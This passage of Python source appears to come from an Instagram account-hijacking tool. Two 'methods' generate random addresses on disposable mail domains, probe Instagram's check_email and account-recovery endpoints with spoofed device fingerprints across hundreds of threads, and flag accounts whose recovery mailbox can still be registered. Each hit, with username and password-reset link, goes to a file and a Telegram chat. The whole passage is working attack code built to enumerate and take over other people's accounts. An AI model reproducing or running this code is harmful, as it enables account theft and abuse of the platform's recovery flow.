            '"fetched_email_token_list":{},"sso_accounts_auth_data":[],"ig_oauth_token":[],'
            '"auth_secure_device_id":"","encrypted_msisdn":"","is_oauth_without_permission":0,'
            '"is_whatsapp_installed":1,"lois_settings":{"lois_token":""},'
            '"flash_call_permissions_status":{"READ_PHONE_STATE":"PERMANENTLY_DENIED",'
            '"READ_CALL_LOG":"DENIED","ANSWER_PHONE_CALLS":"DENIED"}},'
            '"server_params":{"event_request_id":"' + str(uuid.uuid4()) +
            '","is_from_logged_out":0,"device_id":"' + android +
            '","login_surface":"login_home","waterfall_id":"' + str(uuid.uuid4()) +
            '","is_platform_login":0,"login_entry_point":"logged_out",'
            '"family_device_id":"' + family + '","qe_device_id":"' + device + '"}}'
        ),
        'bk_client_context': '{"bloks_version":"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b","styles_id":"instagram"}',
        'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
    }
    headers = {
        'User-Agent': _m2_generate_ua(),
        'accept-language': "en-IN, en-US",
        'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
        'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
        'x-ig-android-id': android,
        'x-ig-app-id': "567067343352427",
        'x-ig-app-locale': "en_IN",
        'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
        'x-ig-device-id': device,
        'x-ig-family-device-id': family,
        'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
    }
    try:
        resp = client.post(url, data=payload, headers=headers)
        if email in resp.text:
            username = None
            m = re.search(r'"username"\s*:\s*"([A-Za-z0-9_.]{1,30})"', resp.text)
            if m:
                username = m.group(1)
            return ('registered', username)
        return ('not_registered', None)
    except Exception:
        return ('unknown', None)


# ── Worker: one persistent client per thread, generate hi2.in email and check ─

_M2_CHARS = 'abcdefghijklmnopqrstuvwxyz'

def _m2_gen_prefix():
    return ''.join(random.choices(_M2_CHARS, k=random.randint(6, 7)))


def _m2_worker(token, chat_id, stop_event):
    global _m2_hits, _m2_good_insta, _m2_bad_insta, _m2_bad_email, _m2_scanned, _m2_total, _m2_found_emails

    try:
        client = httpx.Client(http2=True, timeout=5)
    except Exception:
        client = httpx.Client(timeout=5)

    try:
        while not (stop_event and stop_event.is_set()):
            try:
                email = _m2_gen_prefix() + '@hi2.in'
                _m2_scanned += 1
                _web_state['scanned'] = _m2_scanned

                if stop_event and stop_event.is_set():
                    break

                result_v1 = _m2_check_v1(email, client)

                if result_v1 == 'registered':
                    # Confirm with V2
                    v2_status, username = _m2_check_v2(email, client)
                    if v2_status == 'registered':
                        _m2_good_insta += 1
                        _web_state['good'] = _m2_good_insta
                        # ── hi2.in gate ───────────────────────────────────
                        prefix = email.split('@')[0]
                        if _hi2_check_available(prefix, 'hi2.in'):
                            _m2_record_hit(token, chat_id, email, username)
                        else:
                            _m2_bad_insta += 1
                            _web_state['bad_insta'] = _m2_bad_insta
                        # ─────────────────────────────────────────────────
                    elif v2_status == 'not_registered':
                        _m2_bad_insta += 1
                        _web_state['bad_insta'] = _m2_bad_insta
                    else:
                        # V2 inconclusive — trust V1
                        _m2_good_insta += 1
                        _web_state['good'] = _m2_good_insta
                        prefix = email.split('@')[0]
                        if _hi2_check_available(prefix, 'hi2.in'):
                            _m2_record_hit(token, chat_id, email, username)
                        else:
                            _m2_bad_insta += 1
                            _web_state['bad_insta'] = _m2_bad_insta

                elif result_v1 == 'check_v2':
                    v2_status, username = _m2_check_v2(email, client)
                    if v2_status == 'registered':
                        _m2_good_insta += 1
                        _web_state['good'] = _m2_good_insta
                        # ── hi2.in gate ───────────────────────────────────
                        prefix = email.split('@')[0]
                        if _hi2_check_available(prefix, 'hi2.in'):
                            _m2_record_hit(token, chat_id, email, username)
                        else:
                            _m2_bad_insta += 1
                            _web_state['bad_insta'] = _m2_bad_insta
                        # ─────────────────────────────────────────────────
                    elif v2_status == 'unknown':
                        _m2_bad_email += 1
                        _web_state['bad_email'] = _m2_bad_email
                    else:
                        _m2_bad_insta += 1
                        _web_state['bad_insta'] = _m2_bad_insta
                else:
                    _m2_bad_insta += 1
                    _web_state['bad_insta'] = _m2_bad_insta

            except Exception:
                continue
    finally:
        try:
            client.close()
        except Exception:
            pass


def _m2_record_hit(token, chat_id, email, username=None):
    global _m2_hits, _m2_total
    with _m2_hit_lock:
        _m2_hits  += 1
        _m2_total += 1
        hit_num    = _m2_hits

    profile = username or email.split('@')[0]
    msg = (
        f"\n\n=============================\n"
        f"GOT A HIT  #WEYN HI2 ALT\n"
        f"=============================\n"
        f"TOTAL HITS : {hit_num}\n"
        f"EMAIL      : {email}\n"
        f"USERNAME   : @{profile}\n"
        f"RESET      : https://www.instagram.com/accounts/password/reset/\n"
        f"PROFILE    : https://www.instagram.com/{profile}\n"
        f"=============================\n"
        f"BY ~ @jinbelowg @weyn_vouches"
    )

    _save_hit_to_file(msg)

    hit_entry = json.dumps({"e": email, "u": profile})
    with _m2_found_lock:
        _m2_found_emails.append(hit_entry)
        if len(_m2_found_emails) > 200:
            _m2_found_emails.pop(0)

    _web_state['hits']        = _m2_hits
    _web_state['total']       = _m2_total
    _web_state['recent_hits'] = list(_m2_found_emails[-20:])

    _queue_telegram(token, chat_id, msg)


# ── Web entry point ────────────────────────────────────────────────────────────

def run_method2_web(token, chat_id, min_followers, stop_event):
    global _m2_hits, _m2_good_insta, _m2_bad_insta, _m2_bad_email
    global _m2_taken, _m2_limit, _m2_total, _m2_scanned, _m2_found_emails
    global _m2_pool

    _m2_hits = _m2_good_insta = _m2_bad_insta = _m2_bad_email = 0
    _m2_taken = _m2_limit = _m2_total = _m2_scanned = 0
    _m2_found_emails = []

    _write_session_separator(2)
    _web_state.update({
        'running': True, 'method': '2',
        'hits': 0, 'good': 0, 'bad_insta': 0, 'bad_email': 0,
        'taken': 0, 'limit': 0, 'total': 0, 'scanned': 0,
        'recent_hits': [], 'tg_status': '', 'tg_error': '',
    })

    NUM_WORKERS = int(os.environ.get('M2_WORKERS', 500))
    try:
        pool    = ThreadPoolExecutor(max_workers=NUM_WORKERS)
        _m2_pool = pool
        futures = [
            pool.submit(_m2_worker, token, chat_id, stop_event)
            for _ in range(NUM_WORKERS)
        ]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass
    finally:
        _m2_pool = None
        _web_state['running'] = False


# ══════════════════════════════════════════════════════════════════════════════
#  METHOD 3  —  ULTRA-FAST EMAIL SCANNER  (V2 engine)
# ══════════════════════════════════════════════════════════════════════════════

_m3_hits         = 0
_m3_good_insta   = 0
_m3_bad_insta    = 0
_m3_bad_email    = 0
_m3_taken        = 0
_m3_limit        = 0
_m3_total        = 0
_m3_scanned      = 0
_m3_found_emails: list = []
_m3_found_lock   = Lock()
_m3_hit_lock     = Lock()
_m3_pool: ThreadPoolExecutor = None
_m3_used_emails  = set()
_m3_used_lock    = Lock()

_M3_DOMAINS = ["@hi2.in", "@telegmail.com"]

# Common first names + popular suffixes → human-like usernames with high IG density
_M3_NAMES = [
    "alex","adam","ahmed","ali","anna","bella","ben","carlos","chloe","chris",
    "daniel","david","elena","emma","ethan","fatima","felix","grace","hana","ivan",
    "jack","james","jessica","john","julia","kevin","lara","laura","leo","liam",
    "lily","lucas","luna","marcus","maria","mark","matt","maya","mike","mia",
    "mohamed","nadia","nate","nick","nina","noah","olivia","omar","paris","paul",
    "peter","rachel","ryan","sara","sarah","sofia","steve","tom","tyler","zara",
    "max","sam","kim","jen","dan","kate","amy","jake","jay","joe",
    "nico","rafa","xavi","luca","marco","carlo","mario","luigi","sergio","pablo",
    "yusuf","hamza","hassan","ibrahim","ismail","karim","khalid","layla","nour","rania",
]

_M3_SUFFIXES = [
    "","1","2","7","9","01","07","09","10","11","12","13","21","23","99","00",
    "123","007","111","777","999","2000","2001","2002","2003","2004","2005",
    "2006","2007","2008","2009","2010","official","real","_","__","x","xx",
]


def _m3_gen_username():
    """Generate a human-like username: name+suffix or name+name or random."""
    mode = random.randint(0, 3)
    if mode == 0:
        # name + numeric suffix
        return random.choice(_M3_NAMES) + random.choice(_M3_SUFFIXES)
    elif mode == 1:
        # name + name
        n1, n2 = random.sample(_M3_NAMES, 2)
        return n1 + n2
    elif mode == 2:
        # name + 2-4 digit number
        return random.choice(_M3_NAMES) + str(random.randint(1, 9999))
    else:
        # short random (5-8 chars) with vowels so it looks human
        vowels = 'aeiou'
        cons   = 'bcdfghjklmnpqrstvwxyz'
        length = random.randint(5, 8)
        return ''.join(
            random.choice(vowels) if i % 2 else random.choice(cons)
            for i in range(length)
        )


def _m3_generate_android_ua():
    devices = [
        {"brand": "samsung",  "model": "SM-G973F",      "device": "beyond1",  "board": "exynos9820", "cpu": "exynos9820"},
        {"brand": "samsung",  "model": "SM-A536B",      "device": "a53x",     "board": "s5e8825",    "cpu": "exynos1280"},
        {"brand": "samsung",  "model": "SM-S918B",      "device": "dm1q",     "board": "kalama",     "cpu": "qcom"},
        {"brand": "Google",   "model": "Pixel 6",       "device": "raven",    "board": "raven",      "cpu": "gs101"},
        {"brand": "Google",   "model": "Pixel 7",       "device": "panther",  "board": "panther",    "cpu": "gs201"},
        {"brand": "Xiaomi",   "model": "M2102J20SG",    "device": "ares",     "board": "mt6893",     "cpu": "mtk"},
        {"brand": "Xiaomi",   "model": "Redmi Note 10", "device": "sweet",    "board": "sm6150",     "cpu": "qcom"},
        {"brand": "OnePlus",  "model": "ONEPLUS A6003",  "device": "OnePlus6", "board": "sdm845",     "cpu": "qcom"},
        {"brand": "OPPO",     "model": "CPH2371",        "device": "OP4F1F",   "board": "mt6893",     "cpu": "mtk"},
        {"brand": "HUAWEI",   "model": "ELE-L29",        "device": "HWELE",    "board": "kirin980",   "cpu": "hisilicon"},
    ]
    device      = random.choice(devices)
    android_ver = random.choice(["10", "11", "12", "13", "14"])
    api_level   = {"10": "29", "11": "30", "12": "31", "13": "33", "14": "34"}[android_ver]
    dpi         = random.choice(["320", "360", "394", "411", "420", "440", "450", "480"])
    width       = random.choice(["720", "1080", "1440"])
    height      = random.choice(["1520", "1600", "2280", "2340", "2400", "2560", "3200"])
    ig_ver      = f"{random.randint(280, 340)}.0.0.{random.randint(10, 40)}.{random.randint(80, 150)}"
    locale      = random.choice(["en_US", "en_GB", "ar_SA"])
    rnd_num     = random.randint(300000000, 400000000)
    return (
        f"Instagram {ig_ver} Android ({api_level}/{android_ver}; "
        f"{dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; "
        f"{device['device']}; {device['board']}; {locale}; {rnd_num})"
    )


def _m3_gen_session_id():
    part1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
    part2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
    return f"{part1}:{part2}:{random.randint(100, 999)}"


def _m3_check_v1(email, client):
    """V1: Direct Instagram check_email — HTTP/2 via httpx, fastest path."""
    url = "https://i.instagram.com/api/v1/users/check_email/"
    headers = {
        'User-Agent': _m3_generate_android_ua(),
        'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
        'x-ig-app-id': "567067343352427",
        'accept-language': "en-IN, en-US",
    }
    try:
        resp = client.post(url, data=f"email={email}", headers=headers, timeout=5)
        if 'email_is_taken' in resp.text:
            return "registered"
        elif 'available' in resp.text.lower() or 'Email' in resp.text:
            return "not_registered"
        return "check_v2"
    except Exception:
        return "check_v2"


def _m3_check_v2(email, client):
    """V2: Bloks/CAA search — HTTP/2 fallback, also extracts username."""
    android = "android-" + secrets.token_hex(8)
    device  = str(uuid.uuid4())
    family  = str(uuid.uuid4())
    url     = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
    payload = {
        'params': (
            '{"client_input_params":{"search_query":"' + email +
            '","was_headers_prefill_available":0,"was_headers_prefill_used":0,'
            '"text_input_id":"akyuf0:61","accounts_list":[],"fetched_email_list":[],'
            '"fetched_email_token_list":{},"sso_accounts_auth_data":[],"ig_oauth_token":[],'
            '"auth_secure_device_id":"","encrypted_msisdn":"","is_oauth_without_permission":0,'
            '"is_whatsapp_installed":1,"is_from_logged_in_switcher":0,'
            '"flash_call_permissions_status":{"READ_PHONE_STATE":"PERMANENTLY_DENIED",'
            '"READ_CALL_LOG":"DENIED","ANSWER_PHONE_CALLS":"DENIED"}},'
            '"server_params":{"event_request_id":"' + str(uuid.uuid4()) +
            '","is_from_logged_out":0,"device_id":"' + android +
            '","login_surface":"login_home","waterfall_id":"' + str(uuid.uuid4()) +
            '","is_platform_login":0,"login_entry_point":"logged_out",'
            '"family_device_id":"' + family + '","qe_device_id":"' + device + '"}}'
        ),
        'bk_client_context': '{"bloks_version":"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b","styles_id":"instagram"}',
        'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
    }
    headers = {
        'User-Agent': _m3_generate_android_ua(),
        'accept-language': "en-IN, en-US",
        'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
        'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
        'x-ig-android-id': android,
        'x-ig-app-id': "567067343352427",
        'x-ig-app-locale': "en_IN",
        'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
        'x-ig-device-id': device,
        'x-ig-family-device-id': family,
        'x-ig-timezone-offset': str(int(datetime.now().astimezone().utcoffset().total_seconds())),
        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
    }
    try:
        resp = client.post(url, data=payload, headers=headers, timeout=10)
        if email in resp.text:
            username = None
            user_pk  = None
            m = re.search(r'"username"\s*:\s*"([A-Za-z0-9_.]{1,30})"', resp.text)
            if m:
                username = m.group(1)
            pk_m = re.search(r'"pk"\s*:\s*"?(\d{6,})"?', resp.text)
            if pk_m:
                try:
                    user_pk = int(pk_m.group(1))
                except Exception:
                    pass
            return ("registered", username, user_pk)
        return ("not_registered", None, None)
    except Exception:
        return ("unknown", None, None)


def _m3_check_domain_mx(domain):
    """Quick DNS MX check via Google DNS-over-HTTPS — no recaptcha, no IMAP."""
    try:
        r = requests.get(
            f"https://dns.google/resolve?name={domain}&type=MX",
            headers={'User-Agent': 'Mozilla/5.0'},
            timeout=5
        )
        if r.status_code == 200:
            return bool(r.json().get('Answer'))
    except Exception:
        pass
    return False


def _m3_save_hit(token, chat_id, email, method_label="V1", username=None, has_mx=None):
    global _m3_hits, _m3_total
    domain  = email.split('@')[1]
    prefix  = email.split('@')[0]
    masked  = f"{prefix[0]}{'*' * max(len(prefix) - 2, 1)}{prefix[-1]}@{domain}"
    session_id = _m3_gen_session_id()

    with _m3_hit_lock:
        _m3_hits  += 1
        _m3_total += 1
        hit_num    = _m3_hits

    ig_handle   = username if username else prefix
    profile_url = f"https://www.instagram.com/{ig_handle}"
    mx_flag     = "✓" if has_mx else "?"

    msg = (
        f"WEYN M3 — {domain}\n"
        f"HIT #{hit_num}\n"
        f"EMAIL  : {email}\n"
        f"MASKED : {masked}\n"
        f"STATUS : REGISTERED ({method_label})\n"
        f"DOMAIN : {mx_flag} MX valid\n"
        f"PROFILE: {profile_url}\n"
        f"RESET  : https://www.instagram.com/accounts/password/reset/\n"
        f"SESSION: {session_id}\n"
        f"_______________________________________\n"
        f"BY ~ @jinbelowg @weyn_vouches"
    )

    _save_hit_to_file(msg)

    entry = json.dumps({"e": email, "m": method_label, "u": username or ""})
    with _m3_found_lock:
        _m3_found_emails.append(entry)
        if len(_m3_found_emails) > 200:
            _m3_found_emails.pop(0)

    _web_state['hits']        = _m3_hits
    _web_state['total']       = _m3_total
    _web_state['recent_hits'] = list(_m3_found_emails[-20:])

    _queue_telegram(token, chat_id, msg)


def _m3_worker(token, chat_id, stop_event):
    global _m3_good_insta, _m3_bad_insta, _m3_bad_email, _m3_scanned, _m3_taken

    try:
        client = httpx.Client(http2=True, timeout=5)
    except Exception:
        client = httpx.Client(timeout=5)

    try:
        while not (stop_event and stop_event.is_set()):
            try:
                user1  = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
                user2  = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
                chosen = random.choice([user1, user2])

                domain_suffix = random.choice(_M3_DOMAINS)
                email         = chosen + domain_suffix

                _m3_scanned += 1
                _web_state['scanned'] = _m3_scanned

                if stop_event and stop_event.is_set():
                    break

                result_v1 = _m3_check_v1(email, client)

                if result_v1 == "registered":
                    # Confirm with V2 — also extracts username + pk
                    v2_status, username, user_pk = _m3_check_v2(email, client)
                    if v2_status == "registered":
                        _m3_good_insta += 1
                        _web_state['good'] = _m3_good_insta
                        # ── hi2.in gate ───────────────────────────────────
                        _eprefix = email.split('@')[0]
                        _edomain = email.split('@')[1]
                        if _hi2_check_available(_eprefix, _edomain):
                            _m3_save_hit(token, chat_id, email, "V1", username, True)
                        else:
                            _m3_bad_insta += 1
                            _web_state['bad_insta'] = _m3_bad_insta
                        # ─────────────────────────────────────────────────
                    elif v2_status == "not_registered":
                        _m3_bad_insta += 1
                        _web_state['bad_insta'] = _m3_bad_insta
                    else:
                        # V2 inconclusive — trust V1
                        _m3_good_insta += 1
                        _web_state['good'] = _m3_good_insta
                        # ── hi2.in gate ───────────────────────────────────
                        _eprefix = email.split('@')[0]
                        _edomain = email.split('@')[1]
                        if _hi2_check_available(_eprefix, _edomain):
                            _m3_save_hit(token, chat_id, email, "V1", username, True)
                        else:
                            _m3_bad_insta += 1
                            _web_state['bad_insta'] = _m3_bad_insta
                        # ─────────────────────────────────────────────────

                elif result_v1 == "check_v2":
                    v2_status, username, user_pk = _m3_check_v2(email, client)
                    if v2_status == "registered":
                        _m3_good_insta += 1
                        _web_state['good'] = _m3_good_insta
                        # ── hi2.in gate ───────────────────────────────────
                        _eprefix = email.split('@')[0]
                        _edomain = email.split('@')[1]
                        if _hi2_check_available(_eprefix, _edomain):
                            _m3_save_hit(token, chat_id, email, "V2", username, True)
                        else:
                            _m3_bad_insta += 1
                            _web_state['bad_insta'] = _m3_bad_insta
                        # ─────────────────────────────────────────────────
                    elif v2_status == "unknown":
                        _m3_bad_email += 1
                        _web_state['bad_email'] = _m3_bad_email
                    else:
                        _m3_bad_insta += 1
                        _web_state['bad_insta'] = _m3_bad_insta
                else:
                    _m3_bad_insta += 1
                    _web_state['bad_insta'] = _m3_bad_insta

            except Exception:
                continue
    finally:
        try:
            client.close()
        except Exception:
            pass


def run_method3_web(token, chat_id, stop_event):
    global _m3_hits, _m3_good_insta, _m3_bad_insta, _m3_bad_email
    global _m3_taken, _m3_limit, _m3_total, _m3_scanned
    global _m3_found_emails, _m3_pool, _m3_used_emails

    _m3_hits = _m3_good_insta = _m3_bad_insta = _m3_bad_email = 0
    _m3_taken = _m3_limit = _m3_total = _m3_scanned = 0
    _m3_found_emails = []
    _m3_used_emails  = set()

    _write_session_separator(3)
    _web_state.update({
        'running': True, 'method': '3',
        'hits': 0, 'good': 0, 'bad_insta': 0, 'bad_email': 0,
        'taken': 0, 'limit': 0, 'total': 0, 'scanned': 0,
        'recent_hits': [], 'tg_status': '', 'tg_error': '',
    })

    NUM_WORKERS = int(os.environ.get('M3_WORKERS', 500))
    try:
        pool = ThreadPoolExecutor(max_workers=NUM_WORKERS)
        _m3_pool = pool
        futures = [
            pool.submit(_m3_worker, token, chat_id, stop_event)
            for _ in range(NUM_WORKERS)
        ]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass
    finally:
        _m3_pool = None
        _web_state['running'] = False


def main():
    pass


if __name__ == "__main__":
    main()
